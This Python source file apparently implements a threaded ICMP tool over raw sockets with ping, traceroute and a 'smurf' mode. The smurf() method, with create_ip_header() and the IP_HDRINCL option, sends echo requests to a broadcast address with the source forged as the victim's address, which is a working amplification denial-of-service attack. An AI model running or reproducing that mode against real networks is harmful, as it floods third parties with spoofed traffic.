from time import time as curr_time
from itertools import zip_longest
from select import select
from struct import unpack
from struct import pack
import threading
import socket
from Config import *


lock = threading.Lock()
write_lock = threading.Lock()


class ICMP(threading.Thread):
    def __init__(self, destination, com, broadcast, count):
        super(ICMP, self).__init__()
        self.destination = destination
        self.broadcast = broadcast
        self.count = count
        self.timeout = TIMEOUT
        self.com = com
        self.id = threading.get_ident()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    def run(self):
        super(ICMP, self).run()
        self.id = threading.get_ident()
        if self.com == PING_CMD:
            self.ping()
        elif self.com == TRACE_CMD:
            self.traceroute()
        elif self.com == SMURF_CMD:
            self.s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # ip header include
            # self.s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            self.smurf()
        self.s.close()

    @staticmethod
    def write_log_thread_safe(text):
        with write_lock:
            print('{:10s} {}'.format(threading.current_thread().getName(), text))

    @staticmethod
    def calculate_checksum(data):
        _res = 0
        _i = 0
        while _i < len(data):
            if _i == len(data) - 1:
                calc = data[_i]
            elif _i > len(data) - 1:
                calc = 0
            else:  # count < len(data)
                calc = data[_i + 1] * 256 + data[_i]
            _res = (_res + calc) & 0xffffffff
            _i += 2
        _res = (_res >> 16) + (_res & 0xffff)
        _res += (_res >> 16)
        _res = ~_res & 0xffff
        return _res >> 8 | (_res << 8 & 0xff00)

    def create_icmp_packet(self):
        """ Header: type(8), code(8), checksum(16), id(16), sequence(16) """
        payload = b'_' + bytes(str(curr_time()), 'UTF-8') + b'_'
        checksum = self.calculate_checksum(pack('bbHHh', 8, 0, 0, self.id, 1) + payload)
        return pack('bbHHh', 8, 0, socket.htons(checksum), self.id, 1) + payload

    @staticmethod
    def create_ip_header(src, dst):
        packet = b''
        packet += b'\x45'  # Version (IPv4) + Internet Protocol header length
        packet += b'\x00'  # No quality of service
        packet += b'\x00\x54'  # Total frame length
        packet += b'\x23\x2c'  # Id of this packet
        packet += b'\x40'  # Flags (Don't Fragment)
        packet += b'\x00'  # Fragment offset: 0
        packet += b'\x40'  # Time to live: 64
        packet += b'\x01'  # Protocol: ICMP (1)
        packet += b'\x0a\x0a'  # Checksum (python does the work for us)
        packet += socket.inet_aton(src)  # Source IP
        packet += socket.inet_aton(dst)  # Destination IP
        return packet

    def send_single_req(self, ttl=128):
        self.s.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
        packet = self.create_icmp_packet()
        while packet:
            sent = self.s.sendto(packet, (self.destination, 1))
            packet = packet[sent:]

    def recv_res(self, t):
        time_left = self.timeout
        while time_left > 0:
            r_w_e = select([self.s], [], [], time_left)
            time_left = self.timeout - (curr_time() - t)
            if not r_w_e[0]:
                continue
            data, addr = self.s.recvfrom(1024, socket.MSG_PEEK)
            time_received = curr_time()
            index2 = data.rfind(b'_')
            index1 = data[:index2].rfind(b'_')
            time_sent = float(data[index1 + 1:index2].decode('UTF-8')) if index1 != -1 and index2 != -1 else t
            if self.com == TRACE_CMD:
                self.s.recvfrom(1024)
                return addr, time_received - time_sent
            header = data[20:28]
            type, code, checksum, p_id, sequence = unpack('bbHHh', header)
            if p_id == self.id:
                self.s.recvfrom(1024)
                return addr, time_received - time_sent
            self.s.recvfrom(1024)  # WUUUUUUUT
        return None, None

    def ping(self):
        total_time = 0
        success_count = 0
        for i in range(self.count):
            self.write_log_thread_safe('Pinging {}.........'.format(self.destination))
            try:
                with lock:
                    self.send_single_req()
                    addr, delay = self.recv_res(curr_time())
            except (socket.gaierror, OSError):
                self.write_log_thread_safe('Wrong address')
                return
            if delay is None:
                self.write_log_thread_safe('Timeout Exceed')
            else:
                delay = round(delay * 1000.0, 4)
                total_time += delay
                success_count += 1
                self.write_log_thread_safe('Got ping response for {} in {} milliseconds.'.format(addr[0], delay))
        if success_count:
            avg_time = round(total_time / success_count, 2)
            self.write_log_thread_safe('Success count: {}/{} Avg time: {}'.format(success_count, self.count, avg_time))

    def traceroute(self):
        for x in range(1, self.count):
            try:
                with lock:
                    self.send_single_req(x)
                    t1 = self.recv_res(curr_time())
                with lock:
                    self.send_single_req(x)
                    t2 = self.recv_res(curr_time())
                with lock:
                    self.send_single_req(x)
                    t3 = self.recv_res(curr_time())
            except (socket.gaierror, OSError):
                self.write_log_thread_safe('Wrong address')
                return
            t1str = '*' if t1 == (None, None) else '{:15s} : {:5.2f} ms'.format(t1[0][0], t1[1] * 1000)
            t2str = '*' if t2 == (None, None) else '{:15s} : {:5.2f} ms'.format(t2[0][0], t2[1] * 1000)
            t3str = '*' if t3 == (None, None) else '{:15s} : {:5.2f} ms'.format(t3[0][0], t3[1] * 1000)
            self.write_log_thread_safe('{:2s} -- {}  {}  {}'.format(str(x), t1str, t2str, t3str))

            if t1 != (None, None) and t1[0][0] == socket.gethostbyname(self.destination):  # destination reached
                break

    def smurf(self):
        try:
            packet = self.create_ip_header(src=self.destination, dst=self.broadcast) + self.create_icmp_packet()
        except (OSError, TypeError):
            self.write_log_thread_safe('Illegal or missed address detected.')
            return
        for _ in range(self.count):
            _packet = packet
            while _packet:
                sent = self.s.sendto(_packet, (self.destination, 0))
                _packet = _packet[sent:]
                self.write_log_thread_safe('Sent smurfik to {} from {}'.format(self.destination, self.broadcast))


def main(hosts, broadcasts, com, n):
    threads = []
    for h, b in zip_longest(hosts, broadcasts, fillvalue=None):
        threads.append(ICMP(h, com, b, n))
        threads[-1].start()
    [thread.join() for thread in threads]
